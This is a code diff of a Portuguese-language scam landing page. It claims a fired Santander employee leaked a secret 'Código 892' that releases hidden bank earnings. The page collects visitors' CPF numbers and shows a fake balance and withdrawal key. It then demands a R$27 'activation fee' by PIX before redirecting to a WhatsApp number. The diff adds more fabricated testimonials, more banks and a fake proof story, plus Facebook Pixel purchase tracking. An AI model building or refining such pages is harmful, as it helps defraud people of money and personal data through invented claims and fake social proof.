@@ -30,10 +30,15 @@
         .page { display: none; padding: 20px; }
         .page.active { display: block; }
         .online-tag { background: #000; color: #00ff00; text-align: center; font-size: 10px; padding: 5px; font-weight: bold; }
+        
+        /* Botão Arredondado Moderno */
         .btn-modern { font-family: 'Montserrat', sans-serif; background: #28a745; color: white; font-size: 20px; font-weight: 900; padding: 20px; border-radius: 50px; text-align: center; display: block; width: 100%; animation: grow 1.5s infinite alternate; text-transform: uppercase; border: none; cursor: pointer; }
         @keyframes grow { from { transform: scale(1); } to { transform: scale(1.02); } }
+
         .loading-circle { border: 8px solid #f3f3f3; border-top: 8px solid #28a745; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Comentários Layout 2026 */
         .comment-item { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #eee; padding-bottom: 10px; }
         .comment-item img { width: 45px; height: 45px; border-radius: 50%; }
         .comment-name { color: #000; font-weight: 700; font-size: 15px; }
@@ -59,11 +64,12 @@
             <p class="text-lg mb-4">Preste muita atenção no que vou te falar. Fui demitido após 20 anos no Santander por um motivo: eu tentei ajudar uma cliente idosa que estava sem dinheiro para comprar remédio e tentou fazer um empréstimo de R$ 150,00. Não aguentei ver o banco negando aquilo e ativei a chave de rendimentos para resgatar o que era dela. 20 minutos depois me mandaram embora.</p>
             <p class="text-lg mb-4">O que os bancos escondem de você é a <b>CHAVE DOS RENDIMENTOS OCULTOS</b> Internamente chamamos de CÓDIGO 892. Toda vez que você movimenta sua conta ou paga uma taxa, o banco gera um rendimento extra que deveria ser seu, mas eles retêm para lucrar bilhões.</p>
             <p class="text-lg mb-4">Oficialmente pela Lei nº 8.036 essa chave só é liberada para <b>CLIENTES COM RENDA ACIMA DE R$ 25.000,00 COMPROVADA</b>. Mas eu copiei o acesso antes de sair do prédio do protocolo que permite qualquer pessoa consultar seu saldo e ativar o saque através de uma chave de ativação única. É simples: você só precisa gerar, ativar sua chave no seu banco e pronto, saque seu saldo dos rendimentos ocultos. Após a ativação você irá receber meu Whatsapp Pessoal, se tiver alguma dúvida é só me chamar que eu te ajudo.</p>
+            <p class="text-lg mb-4">Meu irmão ativou a chave de dele hoje mais cedo no Inter e o valor desbloqueou na conta dele no mesmo instante, veja abaixo:</p>
             
             <img src="https://github.com/portal-verificador-br/robertomenezes/blob/main/inter.png?raw=true" class="w-full border-2 border-black rounded-lg my-4 shadow-lg">
 
             <div class="bg-yellow-50 border-2 border-dashed border-yellow-400 p-6 rounded-xl text-center my-6">
-                <button onclick="trackVC(); nextPage(2)" class="btn-modern">CONSULTAR VALORES DE RENDIMENTOS</button>
+                <button onclick="fbq('track', 'ViewContent'); nextPage(2)" class="btn-modern">CONSULTAR VALORES DE RENDIMENTOS</button>
             </div>
 
             <div class="mt-10">
@@ -76,13 +82,45 @@
                     <img src="https://randomuser.me/api/portraits/women/44.jpg">
                     <div><p class="comment-name">Mariana Cavalcante Lins</p><p class="comment-text">O valor caiu em 2 minutos na minha conta do Nubank. Chocada!</p><p class="comment-meta">Curtir · Responder · 5 min</p></div>
                 </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/15.jpg">
+                    <div><p class="comment-name">Ricardo Santos</p><p class="comment-text">Trabalhei em banco e sei que o 892 existe mesmo. Finalmente alguém abriu o bico.</p><p class="comment-meta">Curtir · Responder · 12 min</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/women/22.jpg">
+                    <div><p class="comment-name">Beatriz Lima Oliveira</p><p class="comment-text">Gente, funciona! PIX de 2400 caiu na hora.</p><p class="comment-meta">Curtir · Responder · 18 min</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/45.jpg">
+                    <div><p class="comment-name">João Marcos</p><p class="comment-text">Tinha 1850 parado lá desde 2021. Valeu Roberto!</p><p class="comment-meta">Curtir · Responder · 25 min</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/women/65.jpg">
+                    <div><p class="comment-name">Sandra Alencar</p><p class="comment-text">Consegui pro meu pai tbm, ele ficou super feliz.</p><p class="comment-meta">Curtir · Responder · 30 min</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/88.jpg">
+                    <div><p class="comment-name">Paulo André</p><p class="comment-text">Duvidei no começo mas é real. Protocolo 892 ativado.</p><p class="comment-meta">Curtir · Responder · 45 min</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/women/33.jpg">
+                    <div><p class="comment-name">Patrícia Guedes</p><p class="comment-text">Saquei 2700 que o banco tava lucrando em cima de mim. Justo!</p><p class="comment-meta">Curtir · Responder · 1h</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/men/22.jpg">
+                    <div><p class="comment-name">Lucas Ferraz Monteiro</p><p class="comment-text">Top demais, dinheiro na conta sem burocracia.</p><p class="comment-meta">Curtir · Responder · 1h</p></div>
+                </div>
+                <div class="comment-item">
+                    <img src="https://randomuser.me/api/portraits/women/11.jpg">
+                    <div><p class="comment-name">Carla Souza</p><p class="comment-text">Obrigada por ajudar a gente Roberto, o banco já ganha muito.</p><p class="comment-meta">Curtir · Responder · 2h</p></div>
+                </div>
             </div>
         </div>
 
         <div id="p2" class="page">
             <h2 class="text-xl font-black text-center mb-8 italic uppercase">PARA CONSULTAR SEUS RENDIMENTOS INSIRA SEU CPF ABAIXO:</h2>
             <input type="tel" id="cpf_user" oninput="mask(this, '###.###.###-##')" class="w-full p-5 bg-gray-100 rounded-full outline-none font-bold text-center text-xl mb-6 border-2 border-transparent focus:border-green-500" placeholder="000.000.000-00">
-            <button onclick="trackVC(); loader(3, 4, 'Consultando Banco de Dados Central (API)...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
+            <button onclick="fbq('track', 'ViewContent'); loader(3, 4, 'Consultando Banco de Dados Central (API)...', 5000)" class="btn-modern">CONSULTAR AGORA</button>
         </div>
 
         <div id="p3" class="page text-center py-20">
@@ -96,7 +134,7 @@
                 <p class="text-[10px] font-bold text-gray-400 uppercase mb-2">Rendimentos Acumulados 2021-2025</p>
                 <p class="text-5xl font-black">R$ <span id="rand_val">0,00</span></p>
             </div>
-            <button onclick="trackVC(); nextPage(5)" class="btn-modern">GERAR CHAVE DE SAQUE</button>
+            <button onclick="fbq('track', 'ViewContent'); nextPage(5)" class="btn-modern">GERAR CHAVE DE SAQUE</button>
         </div>
 
         <div id="p5" class="page text-center">
@@ -105,11 +143,15 @@
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">ITAÚ</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BRADESCO</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">CAIXA</div>
-                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">NUBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">BANCO DO BRASIL</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">SANTANDER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">NUBANK</div>
                 <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">INTER</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">C6 BANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">PAGBANK</div>
+                <div onclick="sel(this)" class="p-3 border-2 rounded-full font-bold cursor-pointer text-sm">PICPAY</div>
             </div>
-            <button onclick="trackVC(); loader(6, 7, 'Gerando Chave Criptografada...', 6000)" class="btn-modern">GERAR CHAVE</button>
+            <button onclick="fbq('track', 'ViewContent'); loader(6, 7, 'Gerando Chave Criptografada...', 6000)" class="btn-modern">GERAR CHAVE</button>
         </div>
 
         <div id="p6" class="page text-center py-20">
@@ -120,7 +162,7 @@
         <div id="p7" class="page text-center">
             <h2 class="text-xl font-black mb-6 uppercase italic">Chave de Saque Gerada com Sucesso!</h2>
             <div class="bg-gray-100 p-6 text-2xl font-mono font-black border-2 border-dashed border-gray-400 mb-8 rounded-xl">892-TX-2026</div>
-            <button onclick="trackVC(); finalLoader()" class="btn-modern">ATIVAR CHAVE E SACAR RENDIMENTOS</button>
+            <button onclick="fbq('track', 'ViewContent'); finalLoader()" class="btn-modern">ATIVAR CHAVE E SACAR RENDIMENTOS</button>
         </div>
 
         <div id="p8" class="page text-center py-20">
@@ -134,63 +176,43 @@
                 <h3 class="text-2xl font-black text-red-600 mb-4 uppercase">Erro de Ativação</h3>
                 <p class="text-sm mb-6">O Servidor não localizou o pagamento da <b>Taxa de Chave para Saque de Rendimentos (TAC).</b> Realize o pagamento da taxa do seu Token de Segurança para validar o Protocolo 892 e liberar o resgate imediatamente..</p>
                 <div class="bg-gray-100 p-6 rounded-xl mb-6"><p class="text-4xl font-black">R$ 27,00</p></div>
-                <button onclick="trackIC(); nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR CHAVE</button>
+                <button onclick="fbq('track', 'InitiateCheckout'); nextPage(10)" class="btn-modern" style="background:#c00">PAGAR E ATIVAR CHAVE</button>
             </div>
         </div>
 
         <div id="p10" class="page">
-            <h2 class="text-xl font-black text-center mb-2 uppercase italic">Finalize a Ativação da sua Chave</h2>
-            
-            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
-                <p class="text-[12px] text-blue-900 leading-tight">
-                    <b>AUTENTICAÇÃO PENDENTE:</b> Esta taxa de R$ 27,00 é processada pelo terminal do Diretor Financeiro responsável pela liberação: 
+            <h2 class="text-xl font-black text-center mb-2 uppercase italic">Finalize a ativação da sua chave</h2>
+            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-4">
+                <p class="text-[11px] text-blue-900 leading-tight">
+                    <b>AUTENTICAÇÃO:</b> Esta taxa é processada pelo terminal do Diretor Financeiro responsável: 
                     <br><span class="text-sm font-bold uppercase underline">EMMANUEL VICTOR</span>.
                 </p>
             </div>
-
-            <div class="border p-6 rounded-3xl text-center bg-gray-50 shadow-inner">
-                <p class="text-red-600 font-bold mb-4">⏳ EXPIRA EM: <span id="timer">05:00</span></p>
+            <div class="border p-6 rounded-xl text-center bg-gray-50 shadow-inner">
+                <p class="text-red-600 font-bold mb-4">EXPIRA EM: <span id="timer">05:00</span></p>
+                <img src="qrcode.png" class="mx-auto mb-4 border-4 border-white shadow-md max-w-[180px]">
                 
-                <img src="qrcode.png" class="mx-auto mb-6 border-4 border-white shadow-md max-w-[200px]">
+                <input type="text" id="pixCode" readonly value="COLE_SEU_PIX_AQUI" class="w-full p-2 bg-white border rounded mb-2 text-[10px] text-center font-mono">
+                <button onclick="copyPix()" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-4 text-sm uppercase">Copia e Cola PIX</button>
                 
-                <p class="text-[10px] font-bold text-gray-400 uppercase mb-2">Código PIX Copia e Cola:</p>
-                <input type="text" id="pixCode" readonly value="INSIRA_SEU_CODIGO_PIX_AQUI_DA_INFINITY" class="w-full p-3 bg-white border rounded-lg text-[10px] mb-2 text-center font-mono">
-                
-                <button onclick="copyPix()" class="w-full bg-blue-600 text-white font-black py-4 rounded-full mb-6 text-sm">COPIAR CÓDIGO PIX</button>
-                
-                <hr class="my-6">
-
-                <button onclick="btnJaPaguei()" class="w-full bg-green-600 text-white font-black py-5 rounded-2xl text-lg shadow-lg animate-bounce">
-                    ✅ JÁ PAGUEI, LIBERAR MEU SALDO
+                <button onclick="fbq('track', 'Purchase', {value: 27.00, currency: 'BRL'}); window.location.href='https://wa.me/5511983836605?text=Já realizei o pagamento da taxa de 27 reais e quero liberar meu saldo agora!';" class="w-full bg-green-600 text-white font-black py-5 rounded-2xl text-lg shadow-lg">
+                    ✅ JÁ PAGUEI, LIBERAR SALDO
                 </button>
-
-                <p class="text-[9px] text-gray-400 uppercase font-bold mt-6 tracking-widest">Protocolo 892 - Diretor Emmanuel Victor</p>
+                <p class="text-[9px] text-gray-400 uppercase font-bold mt-4">Protocolo 892 - Diretor Emmanuel Victor</p>
             </div>
         </div>
 
     </div>
 
     <script>
-        // Funções do Pixel
-        function trackVC() { fbq('track', 'ViewContent'); }
-        function trackIC() { fbq('track', 'InitiateCheckout'); }
-        function trackPur() { fbq('track', 'Purchase', {value: 27.00, currency: 'BRL'}); }
-
-        function btnJaPaguei() {
-            trackPur();
-            // Redireciona para o WhatsApp
-            window.location.href = "https://wa.me/5511983836605?text=Já realizei o pagamento da taxa de 27 reais e quero liberar meu saldo agora!";
-        }
-
         function copyPix() {
             var copyText = document.getElementById("pixCode");
             copyText.select();
             copyText.setSelectionRange(0, 99999);
             document.execCommand("copy");
-            alert("Código PIX copiado com sucesso!");
+            alert("Código PIX copiado!");
         }
 
-        // Navegação e Lógica Original (Inalterada)
         function nextPage(n) {
             document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
             document.getElementById('p' + n).classList.add('active');
@@ -220,10 +242,10 @@
 
         function startTimer() {
             let t = 300, m, s;
-            let timerInterval = setInterval(() => {
+            let ti = setInterval(() => {
                 m = parseInt(t / 60, 10); s = parseInt(t % 60, 10);
                 document.getElementById('timer').textContent = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
-                if (--t < 0) { clearInterval(timerInterval); }
+                if (--t < 0) clearInterval(ti);
             }, 1000);
         }
 
